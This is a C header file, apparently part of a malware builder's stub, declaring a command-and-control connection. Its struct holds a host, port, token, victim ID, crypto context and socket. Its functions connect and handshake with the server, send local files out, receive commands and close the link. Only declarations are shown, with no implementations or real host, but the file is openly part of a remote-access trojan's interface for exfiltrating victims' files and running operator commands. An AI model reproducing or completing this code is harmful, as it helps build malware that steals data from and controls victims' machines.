/* builder/stub/c2.h */
#ifndef C2_H
#define C2_H
#include <stdint.h>
#include "crypto.h"

typedef struct {
    const char *host;
    uint16_t    port;
    const char *token;
    const char *victim_id;
    crypto_ctx *crypto;
    void       *sock; /* SOCKET */
} c2_conn;

int  c2_connect(c2_conn *c);
int  c2_handshake(c2_conn *c);
int  c2_send_file(c2_conn *c, const char *local_path);
int  c2_recv_cmd(c2_conn *c, char *buf, size_t cap);
void c2_close(c2_conn *c);
#endif
